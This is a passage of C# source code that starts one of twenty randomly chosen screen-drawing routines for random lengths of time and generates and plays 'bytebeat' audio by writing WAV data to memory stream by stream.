                    case 12:
                        drawer12.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer12.Stop();
                        break;
                    case 13:
                        drawer13.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer13.Stop();
                        break;
                    case 14:
                        drawer14.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer14.Stop();
                        break;
                    case 15:
                        drawer15.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer15.Stop();
                        break;
                    case 16:
                        drawer16.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer16.Stop();
                        break;
                    case 17:
                        drawer17.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer17.Stop();
                        break;
                    case 18:
                        drawer18.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer18.Stop();
                        break;
                    case 19:
                        drawer19.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer19.Stop();
                        break;
                    case 20:
                        drawer20.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer20.Stop();
                        break;
                }
            }
        }

        private static Random random = new Random();
        public static int GetSomeRandomNumber(int min, int max)
        {
            ThreadLocal<Random> random =
        new ThreadLocal<Random>(() => new Random());
            return random.Value.Next(min, max);
        }

        private class randomdrawer1 : Drawer
        {
            public override void Draw(IntPtr hdc)
            {
                Random rnd = new Random(Guid.NewGuid().GetHashCode());
                int ra = GetSomeRandomNumber(1, 21);
                Drawer drawer = new Drawer1();
                Drawer drawer2 = new Drawer2();
                Drawer drawer3 = new Drawer3();
                Drawer drawer4 = new Drawer4();
                Drawer drawer5 = new Drawer5();
                Drawer drawer6 = new Drawer6();
                Drawer drawer7 = new Drawer7();
                Drawer drawer8 = new Drawer8();
                Drawer drawer9 = new Drawer9();
                Drawer drawer10 = new Drawer10();
                Drawer drawer11 = new Drawer11();
                Drawer drawer12 = new Drawer12();
                Drawer drawer13 = new Drawer13();
                Drawer drawer14 = new Drawer14();
                Drawer drawer15 = new Drawer15();
                Drawer drawer16 = new Drawer16();
                Drawer drawer17 = new Drawer17();
                Drawer drawer18 = new Drawer18();
                Drawer drawer19 = new Drawer19();
                Drawer drawer20 = new Drawer20();
                switch (ra)
                {
                    case 20:
                        drawer.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer.Stop();
                        break;
                    case 19:
                        drawer2.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer2.Stop();
                        break;
                    case 18:
                        drawer3.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer3.Stop();
                        break;
                    case 17:
                        drawer4.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer4.Stop();
                        break;
                    case 16:
                        drawer5.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer5.Stop();
                        break;
                    case 15:
                        drawer6.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer6.Stop();
                        break;
                    case 14:
                        drawer7.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer7.Stop();
                        break;
                    case 13:
                        drawer8.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer8.Stop();
                        break;
                    case 12:
                        drawer9.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer9.Stop();
                        break;
                    case 11:
                        drawer10.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer10.Stop();
                        break;
                    case 10:
                        drawer11.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer11.Stop();
                        break;
                    case 9:
                        drawer12.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer12.Stop();
                        break;
                    case 8:
                        drawer13.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer13.Stop();
                        break;
                    case 7:
                        drawer14.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer14.Stop();
                        break;
                    case 6:
                        drawer15.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer15.Stop();
                        break;
                    case 5:
                        drawer16.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer16.Stop();
                        break;
                    case 4:
                        drawer17.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer17.Stop();
                        break;
                    case 3:
                        drawer18.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer18.Stop();
                        break;
                    case 2:
                        drawer19.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer19.Stop();
                        break;
                    case 1:
                        drawer20.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer20.Stop();
                        break;
                }
            }
        }
        private static void byte1(int hz, int secs)
        {
            Random random = new Random();
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = hz;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = secs;

                var data = new byte[sample_rate * seconds];

                for (var t = 2; t < data.Length; t++)
                    data[t] = (byte)(
                        128*Math.Sin((((((t*t))+2) / ((t >> 10)+2)))/40.75)+128
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
        }
        private static void byte2(int hz, int secs)
        {
            Random random = new Random();
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = hz;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = secs;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                        (((t * t)) + 2) / ((t >> 16) + 2)
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
        }
        private static void byte3(int hz, int secs)
        {
            Random random = new Random();
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = hz;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = secs;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                        128 * Math.Sin(((t * (t >> 9 | 9)) * t >> 12)) + 128
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
        }
        private static void byte4(int hz, int secs)
        {
            Random random = new Random();
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = hz;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = secs;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                        (128 * Math.Sin(t * t >> 10)) * Math.Sin(t * (t & t >> 10)) + 128
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
        }
        private static void byte5(int hz, int secs)
        {
            Random random = new Random();
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = hz;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = secs;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                        (t * t >> 8) * Math.Sqrt((t & t >> 8))
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
        }
        private static void byte6(int hz, int secs)
        {
            Random random = new Random();
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = hz;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = secs;

                var data = new byte[sample_rate * seconds];
                int rrr = random.Next(1, 8);
                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                        (128 * Math.Sin(t) + (128 * Math.Sin(t/5120)))
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
        }
        private static void byte7(int hz, int secs)
        {
            Random random = new Random();
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = hz;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = secs;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                        (128 * Math.Sin(129 * t % ((t >> 7)+2)) + (128 * Math.Sin((t+2) / (t + 2))))
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
        }
        private static void byte8(int hz, int secs)
        {
            Random random = new Random();
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = hz;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = secs;

                var data = new byte[sample_rate * seconds];
                int rrr = random.Next(8);
                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                        (128 * Math.Sin(129 * (t >> 10)) + (128 * Math.Sin(t * t * t)))
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
        }
        private static void byte9(int hz, int secs)
        {
            Random random = new Random();
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = hz;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = secs;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                    (128 * Math.Sin((t / 512))) * Math.Sin((t * (t >> 8 | t << 5)) / 40.75)
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
        }
        private static void byte10(int hz, int secs)
        {
            Random random = new Random();
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = hz;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = secs;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                    128 * Math.Sin((17 * t | (t >> 2) + (Convert.ToBoolean(t & 32768) ? 13 : 14) * t | t >> 3 | t >> 5) * t >> 16) + 128
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
        }
        private static void byte11(int hz, int secs)
        {
            Random random = new Random();
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = hz;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = secs;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                    128 * Math.Sin((t ^ t % 1001 + t ^ t % 1002)) + 128
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
        }
        private static void byte12(int hz, int secs)
        {
            Random random = new Random();
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = hz;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = secs;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                    128 * Math.Sin((t * ((t >> 10 | t % 16 * t >> 5) & 8 * t >> 12 & 18) * t >> 16) / 40.75)
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
        }
        private static void byte13(int hz, int secs)
        {
            Random random = new Random();
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = hz;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = secs;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                    128 * Math.Sin((t * (t | t >> 5)) / 40.75) + 128
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
        }
        private static void byte14(int hz, int secs)
        {
            Random random = new Random();
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = hz;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = secs;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                    Math.Sqrt(128 * Math.Sin(((t & t >> 6) + (t | t >> 8) + (t | t >> 7) + (t | t >> 9)) * t >> 16)) - 9
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
        }
        private static void byte15(int hz, int secs)
        {
            Random random = new Random();
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = hz;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = secs;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                    (int)(t ^ t - t + 2 * 6 * (int)Math.Cos(t) - 12 * (int)Math.Tan(t >> 9)) * t >> 16
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
        }
        private static void byte16(int hz, int secs)
        {
            Random random = new Random();
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = hz;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = secs;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                    ((1.0015 * Math.Sin(((t * "66546657"[t >> 13 & 7])+2)))+2 / ((t >> 1)+2) % ((t * t >> 6)+2))
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
        }
        private static void byte17(int hz, int secs)
        {
            Random random = new Random();
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = hz;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = secs;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                    128*Math.Sin("2230290303535332929303030290302218182211"[(t >> 12) % 32] * t & 192) / 2 + ("020202030"[(t >> 13) % 8] * t >> 2 & 128)+128
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
        }
        private static void byte18(int hz, int secs)
        {
            Random random = new Random();
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = hz;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

